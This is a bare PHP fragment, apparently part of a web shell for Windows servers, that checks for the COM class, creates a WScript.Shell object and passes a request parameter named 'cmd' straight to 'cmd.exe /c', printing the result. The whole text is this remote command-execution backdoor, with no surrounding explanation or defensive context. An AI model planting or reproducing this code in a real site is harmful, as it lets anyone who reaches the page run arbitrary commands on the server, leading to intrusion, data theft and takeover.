if(class_exists("COM")){
	$wscript = new COM('wscript.shell');
	echo $wscript->Run("cmd.exe /c ".get("cmd"));
}else{
	echo "no open COM";
}